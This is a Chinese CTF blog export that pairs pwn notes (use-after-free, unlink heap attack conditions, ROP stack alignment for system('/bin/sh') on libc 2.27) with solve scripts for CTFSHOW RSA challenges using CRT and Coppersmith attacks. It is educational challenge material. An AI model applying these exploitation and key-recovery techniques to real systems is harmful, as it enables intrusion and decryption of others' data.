<p>ubuntu19.04-&gt;glibc2.29</p>
<p>ubuntu20.04-&gt;glibc2.30</p>
<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>use after free</p>
<ul>
<li>Free后空间置0</li>
<li>Free后空间不置0</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;test, <span class="number">40</span>);</span><br><span class="line"><span class="built_in">free</span>(test);</span><br><span class="line"><span class="meta"># test=NULL;</span></span><br></pre></td></tr></table></figure>

<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>在双向链表中取出一个chunk的操作</p>
<p>利用条件：</p>
<ol>
<li><p>存在uaf漏洞，或者可以修改free状态下的smallbin或者unsorted bin的fd和kb指针</p>
</li>
<li><p>已知位置存在一个可以uaf的指针</p>
</li>
</ol>
<p>效果：</p>
<p>可以使得uaf的chunk指向p=p-3</p>
<p>修改思路：</p>
<ol>
<li><p>修改fd为p-3</p>
</li>
<li><p>修改bk为p-2</p>
</li>
</ol>
<h2 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h2><h2 id="gdb调试-amp-pwngdb插件"><a href="#gdb调试-amp-pwngdb插件" class="headerlink" title="gdb调试 &amp; pwngdb插件"></a>gdb调试 &amp; pwngdb插件</h2><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><h4 id="栈溢出ROP链打不通之libc-2-27-so🐕都不用"><a href="#栈溢出ROP链打不通之libc-2-27-so🐕都不用" class="headerlink" title="栈溢出ROP链打不通之libc-2.27.so🐕都不用"></a>栈溢出ROP链打不通之<code>libc-2.27.so</code>🐕都不用</h4><p>Fr.<a href="https://gmabru.yuque.com/iw46u7/zt2b1i/wa0rp2">https://gmabru.yuque.com/iw46u7/zt2b1i/wa0rp2</a></p>
<p>由于<code>libc-2.27.so</code>存在栈不平衡的情况（这个我不知道怎么解释，因为我是一只玛卡巴卡），当你精心构造的payload觉得没有什么问题，但就是打不通时，检查libc版本是否是2.27，是则对照是否符合下面几种情况并进行调整</p>
<ol>
<li><p>执行<code>system(&quot;/bin/sh&quot;)</code></p>
<p>如果构造了这样的ROP链</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211213163512389.png" alt="image-20211213163512389"></p>
<p>通过多加几个<code>ret</code>来平衡栈，如</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211213163435522.png" alt="image-20211213163435522"></p>
</li>
<li><p>返回main函数开头重新执行程序</p>
<p>由于一些攻击的特性要从头开始重新执行main函数，这个时候跳转的地址，要么是<code>push rbp</code>，或者是<code>mov rbp, rsp</code></p>
<p>多试几次，成功的应该只有一种情况，可以参考</p>
<p><a href="https://4xwi11.github.io/posts/b83e9e49/#babyrop">https://4xwi11.github.io/posts/b83e9e49/#babyrop</a></p>
</li>
<li><p>还有一个call system还是啥来着？？？</p>
<p>还有有些用不了的<code>system(&quot;/bin/sh&quot;)</code>的地方，可以试试one_gadget，反之亦然</p>
</li>
</ol>
<h4 id="pwn环境docker化"><a href="#pwn环境docker化" class="headerlink" title="pwn环境docker化"></a>pwn环境docker化</h4><p>好像是在别人电脑上也可以用平时的工具和环境 ，以及不用因为题目glibc版本不同而换虚拟机</p>
<p>知世师傅的博客，有需要再搞吧</p>
<p><a href="https://nightrainy.github.io/2020/01/07/pwn%E7%8E%AF%E5%A2%83docker%E5%8C%96/">https://nightrainy.github.io/2020/01/07/pwn环境docker化</a></p>
]]></content>
      <categories>
        <category>CTF-Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>CTFSHOW funnyrsa&amp;unusualrsa系列</title>
    <url>/posts/80806ae5/</url>
    <content><![CDATA[<p>这两个系列有针对RSA密码中，$gcd(e, phi)\neq 1$的，之前Striving师傅也说，这是一个考的大类，特地来重新整理和记录一下，主要是翻译一下la佬的博客</p>
<span id="more"></span>

<h1 id="CTFSHOW-funnyrsa-amp-unusualrsa系列"><a href="#CTFSHOW-funnyrsa-amp-unusualrsa系列" class="headerlink" title="CTFSHOW funnyrsa&amp;unusualrsa系列"></a>CTFSHOW funnyrsa&amp;unusualrsa系列</h1><h2 id="funnyrsa1"><a href="#funnyrsa1" class="headerlink" title="funnyrsa1"></a>funnyrsa1</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">14606334023791426</span></span><br><span class="line">p1 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q1 = <span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">c1 = <span class="number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">13813369129257838</span></span><br><span class="line">p2 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q2 = <span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">c2 = <span class="number">7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>我记得这道题当时困扰了我好久，看网上的WP，去问别的师傅，都不能很好地理解；主要是数论的基础不过关吧</p>
<p>现在再来过一遍</p>
<p>可以看出p1和p2是同一个数，e1和e2分可以分解成</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">2</span> * <span class="number">7</span> * <span class="number">1043309573127959</span></span><br><span class="line">e2 = <span class="number">2</span> * <span class="number">7</span> * <span class="number">986669223518417</span></span><br></pre></td></tr></table></figure>

<p>我直接用下有限域开方（这个后面unusualrsa5也会提到一些），直接出来</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210709101537063.png" alt="image-20210709101537063"></p>
<p>然后记得将中间那个奇怪的东西转换成φ</p>
<p>第一次遇到这道题，主要参考一篇CSDN上的推导，主要是当时e=14试过小指数枚举k，也开不出来就没啥思路了</p>
<p><a href="https://blog.csdn.net/chenzzhenguo/article/details/94339659">https://blog.csdn.net/chenzzhenguo/article/details/94339659</a></p>
<p>现在再观摩一遍又学到了好多，如果不用有限域开14次方的话，由于e=7已经和phi1和phi2都有公因子了，不能继续化简指数，而且经检验，q不满足rabin的条件<br>$$<br>q\ mod\ 4=1<br>$$<br>不过p没有<br>$$<br>p\ mod\ 4=3<br>$$<br>所以这位师傅想到了借助中国剩余定理的思路，着实巧妙</p>
<p>为了方便理清思绪，我把上面的脚本和得出来的新c1和c2展示一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">1043309573127959</span></span><br><span class="line">p1 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q1 = <span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">c1 = <span class="number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">986669223518417</span></span><br><span class="line">p2 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q2 = <span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">c2 = <span class="number">7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span></span><br><span class="line"></span><br><span class="line">phi1 = (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">phi2 = (p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">n1 = p1*q1</span><br><span class="line">n2 = p2*q2</span><br><span class="line"></span><br><span class="line">d1 = invert(e1, phi1)</span><br><span class="line">d2 = invert(e2, phi2)</span><br><span class="line"></span><br><span class="line">c1_14 = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line">c2_14 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c1_14)</span><br><span class="line"><span class="built_in">print</span>(c2_14)</span><br></pre></td></tr></table></figure>

<p>首先用CRT将$m^{14}$转换成在模q1q2下，那个师傅还把p加上了，其实没有必要，选两个就好了<br>$$<br>\begin{align}<br>m^{14}\equiv c_1\ (mod\ q_1)\\<br>m^{14}\equiv c_2\ (mod\ q_2)<br>\end{align}<br>$$<br>解出来的解我们设为c3，将问题转换成新的rsa问题<br>$$<br>m^{14}\equiv c_3\ (mod\ q_1\cdot q_2)<br>$$<br>在如今的局势下，我们可以用上面的思路，先继续化简e，因为发现新的phi和7是互素的；出来的c很小，用小指数攻击就解出来<br>$$<br>c^2\equiv m\ (mod\ n)<br>$$<br>注意这里可不能用rabin，因为上面就说过，q是不满足rabin条件的，平方根算法倒可以试试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line">c = <span class="number">1468508928650711840448592864366550012730179472363882262465351327446412035872207980397128114769992338577161</span></span><br><span class="line">p = <span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">q = <span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(nthroot_mod(c, <span class="number">2</span>, p)))</span><br></pre></td></tr></table></figure>

<p>可解</p>
<h2 id="funnyrsa2"><a href="#funnyrsa2" class="headerlink" title="funnyrsa2"></a>funnyrsa2</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = getPrime(<span class="number">80</span>)</span><br><span class="line">q = getPrime(<span class="number">80</span>)</span><br><span class="line">r = getPrime(<span class="number">80</span>)</span><br><span class="line">n = p * q * r</span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="comment"># n = 897607935780955837078784515115186203180822213482989041398073067996023639</span></span><br><span class="line"><span class="comment"># c = 490571531583321382715358426750276448536961994273309958885670149895389968</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;what_that_fvck_r&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="funnyrsa3"><a href="#funnyrsa3" class="headerlink" title="funnyrsa3"></a>funnyrsa3</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">13851998696110232034312408768370264747862778787235362033287301947690834384177869107768578977872169953363148442670412868565346964490724532894099772144625540138618913694240688555684873934424471837897053658485573395777349902581306875149677867098014969597240339327588421766510008083189109825385296069501377605893298996953970043168244444585264894721914216744153344106498382558756181912535774309211692338879110643793628550244212618635476290699881188640645260075209594318725693972840846967120418641315829098807385382509029722923894508557890331485536938749583463709142484622852210528766911899504093351926912519458381934550361</span></span><br><span class="line">dp = <span class="number">100611735902103791101540576986246738909129436434351921338402204616138072968334504710528544150282236463859239501881283845616704984276951309172293190252510177093383836388627040387414351112878231476909883325883401542820439430154583554163420769232994455628864269732485342860663552714235811175102557578574454173473</span></span><br><span class="line">c = <span class="number">6181444980714386809771037400474840421684417066099228619603249443862056564342775884427843519992558503521271217237572084931179577274213056759651748072521423406391343404390036640425926587772914253834826777952428924120724879097154106281898045222573790203042535146780386650453819006195025203611969467741808115336980555931965932953399428393416196507391201647015490298928857521725626891994892890499900822051002774649242597456942480104711177604984775375394980504583557491508969320498603227402590571065045541654263605281038512927133012338467311855856106905424708532806690350246294477230699496179884682385040569548652234893413</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>dp泄漏攻击，网上一大堆</p>
<h2 id="unusualrsa1"><a href="#unusualrsa1" class="headerlink" title="unusualrsa1"></a>unusualrsa1</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(long_to_bytes(randint(<span class="number">0</span>,<span class="number">30</span>))*<span class="number">208</span>+flag)</span><br><span class="line"><span class="keyword">assert</span>(m.bit_length()==<span class="number">2044</span>)</span><br><span class="line"><span class="built_in">print</span>((m&gt;&gt;<span class="number">315</span>)&lt;&lt;<span class="number">315</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,<span class="number">3</span>,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#14113948189208713011909396304970377626324044633561155020366406284451614054260708934598840781397326960921718892801653205159753091559901114082556464576477585198060530094478860626532455065960136263963965819002575418616768412539016154873800614138683106056209070597212668250136909436974469812231498651367459717175769611385545792201291192023843434476550550829737236225181770896867698281325858412643953550465132756142888893550007041167700300621499970661661288422834479368072744930285128061160879720771910458653611076539210357701565156322144818787619821653007453741709031635862923191561438148729294430924288173571196757351837</span></span><br><span class="line"><span class="comment">#1520800285708753284739523608878585974609134243280728660335545667177630830064371336150456537012842986526527904043383436211487979254140749228004148347597566264500276581990635110200009305900689510908049771218073767918907869112593870878204145615928290375086195098919355531430003571366638390993296583488184959318678321571278510231561645872308920917404996519309473979203661442792048291421574603018835698487725981963573816645574675640357569465990665689618997534740389987351864738104038598104713275375385003471306823348792559733332094774873827383320058176803218213042061965933143968710199376164960850951030741280074168795136</span></span><br><span class="line"><span class="comment">#6635663565033382363211849843446648120305449056573116171933923595209656581213410699649926913276685818674688954045817246263487415328838542489103709103428412175252447323358040041217431171817865818374522191881448865227314554997131690963910348820833080760482835650538394814181656599175839964284713498394589419605748581347163389157651739759144560719049281761889094518791244702056048080280278984031050608249265997808217512349309696532160108250480622956599732443714546043439089844571655280770141647694859907985919056009576606333143546094941635324929407538860140272562570973340199814409134962729885962133342668270226853146819</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>已知m高位，用CopperSmith已知明文高位攻击</p>
<p>拿la佬的脚本来做la佬的题，嘿嘿</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">14113948189208713011909396304970377626324044633561155020366406284451614054260708934598840781397326960921718892801653205159753091559901114082556464576477585198060530094478860626532455065960136263963965819002575418616768412539016154873800614138683106056209070597212668250136909436974469812231498651367459717175769611385545792201291192023843434476550550829737236225181770896867698281325858412643953550465132756142888893550007041167700300621499970661661288422834479368072744930285128061160879720771910458653611076539210357701565156322144818787619821653007453741709031635862923191561438148729294430924288173571196757351837</span></span><br><span class="line">mbar = <span class="number">1520800285708753284739523608878585974609134243280728660335545667177630830064371336150456537012842986526527904043383436211487979254140749228004148347597566264500276581990635110200009305900689510908049771218073767918907869112593870878204145615928290375086195098919355531430003571366638390993296583488184959318678321571278510231561645872308920917404996519309473979203661442792048291421574603018835698487725981963573816645574675640357569465990665689618997534740389987351864738104038598104713275375385003471306823348792559733332094774873827383320058176803218213042061965933143968710199376164960850951030741280074168795136</span></span><br><span class="line">c = <span class="number">6635663565033382363211849843446648120305449056573116171933923595209656581213410699649926913276685818674688954045817246263487415328838542489103709103428412175252447323358040041217431171817865818374522191881448865227314554997131690963910348820833080760482835650538394814181656599175839964284713498394589419605748581347163389157651739759144560719049281761889094518791244702056048080280278984031050608249265997808217512349309696532160108250480622956599732443714546043439089844571655280770141647694859907985919056009576606333143546094941635324929407538860140272562570973340199814409134962729885962133342668270226853146819</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">kbits = <span class="number">315</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x) ^ e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(mbar + x0))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>原理</p>
</blockquote>
<p>先搞清楚题目意思；下面这个print操作显然是将m的低315位变成0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>((m&gt;&gt;<span class="number">315</span>)&lt;&lt;<span class="number">315</span>)</span><br></pre></td></tr></table></figure>

<p>我们直接将m转变成字节，得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0cflag&#123;r54X\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>

<p>显然前面208个<code>\x0c</code>就是随机生成的填充，还有一点flag的头部信息，剩下就全部都是0了</p>
<blockquote>
<p>CopperSmith已知明文高位攻击</p>
</blockquote>
<p>而CopperSmith已知明文高位攻击的模式就是，</p>
<p>当$|x|\leq N^{\frac{1}{e}}$，其中$m=mbar+x$时，下列关于x的方程<br>$$<br>c=m^e\ mod\ n=(mbar+x)^e\ mod\ n，其中mbar=(m&gt;&gt;kbits)&lt;&lt;kbits<br>$$<br>有解</p>
<p>首先我们验证下，条件是否满足；x是315位的，$N^\frac{1}{e}$约有683，条件成立</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708112626326.png" alt="image-20210708112626326"></p>
<p>所以显然对于已知明文高位的攻击，还需要e比较小这个条件，不然e=65537明显解不出来</p>
<p>然后看代码理解；主要的是用到了格，求小根这一类的东西。先构造好上面的方程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = (mbar + x) ^ e - c</span><br></pre></td></tr></table></figure>

<p>然后直接small_roots，设置一下参数。但是更多的也不懂了</p>
<h2 id="unusualrsa2"><a href="#unusualrsa2" class="headerlink" title="unusualrsa2"></a>unusualrsa2</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, x, y</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[(i-<span class="number">5</span>)*i+<span class="number">6</span>==<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> x]))</span><br><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[(j-<span class="number">15</span>)*j+<span class="number">44</span>==<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> y]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x,y:x*m+y,x),<span class="number">17</span>,n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x,y:x*m+y,y),<span class="number">17</span>,n))</span><br><span class="line"></span><br><span class="line"><span class="comment">#23772599983135215481563178266884362291876571759991288577057472733374903836591330410574958472090396886895304944176208711481780781286891334062794555288959410390926474473859289842654809538435377431088422352076225067494924657598298955407771484146155998883073439266427190212827600119365643065276814044272790573450938596830336430371987561905132579730619341196199420897034988685012777895002554746080384319298123154671447844799088258541911028041717897434816921424155687677867019535399434825468160227242441375503664915265223696139025407768146464383537556265875013085702422829200814612395116961538432886116917063119749068212699</span></span><br><span class="line"><span class="comment">#10900151504654409767059699202929100225155892269473271859207513720755903691031362539478242920144073599515746938827937863835169270383721094542639011665235593065932998091574636525973099426040452626893461449084383663453549354608769727777329036059746386523843912382289597182615339786437186169811342356085836838520978047561127661777189045888648773949147220411427306098338616422692914110656004863767719312410906124366000507952960331116878197129010412361636679449281808407214524741732730279777729251515759320442591663641984363061618865267606007355576230009922421807527598213455112981354590909603317525854070358390622096569841</span></span><br><span class="line"><span class="comment">#17298679220717326374674940612143058330715465693318467692839033642321129433471254547497087746971317567301086124779289015934582615377165560688447452762043163082394944604062014490446763247008217251611443338103074143809936437694543761369945095202092750900940979469994907399829695696313513303922266742415376818434932335640062684245008822643258497589196668426788916969378417960200705779461808292296450298558001909603602502604228973101048082095642290047196235959438278631661658312398313171590515776453711432353011579809351076532129444735206408591345372296372378396539831385036814349328459266432393612919118094115543053115450</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>今年过年的时候做的，当时也写了WP。主要分两步吧，先求出x和y</p>
<p>当时有师傅在我博客下面评论，说x和y不一定是只有两个元素，问我为什么这样还可以做；当时我也只给了个肌无力的回答</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708115429140.png" alt="image-20210708115429140"></p>
<p>现在，我已不再是曾经那个菜鸡，而是弱鸡</p>
<p>我们再来分析一下，assert就是条件。首先lambda匿名函数里的x和y并非题目里的x和y，参数罢了；其次这个列表中的元素是True和False，对于secret中的x，只有所有的元素都满足(i-5)*i+6==0这个等式，列表中的所有元素才都是Ture，也只有这样用reduce不断迭代套用x&amp;y最后的返回值才会是True，整个assert才不会报错。y同理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[(i-<span class="number">5</span>)*i+<span class="number">6</span>==<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> x]))</span><br><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[(j-<span class="number">15</span>)*j+<span class="number">44</span>==<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> y]))</span><br></pre></td></tr></table></figure>

<p>所以x和y里面可以有多个元素，不止两个，但比如x，里面就能出现2或者3，管你是[2,3,3,3]，还是[2,3,3,3,2,3,3,3]。</p>
<p>至于下面一个多项式，正如那位师傅说的那样，理论上确实，没有证据这不是一个关于m的多项式，而且系数只有2或3</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x,y:x*m+y,x),<span class="number">17</span>,n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x,y:x*m+y,y),<span class="number">17</span>,n))</span><br></pre></td></tr></table></figure>

<p>总之之前的解法，DDDD，没有比我更懂CTF签到~，就当x=[2,3]，y=[4,11]了，别的情况也没有更多的条件可以明确指明</p>
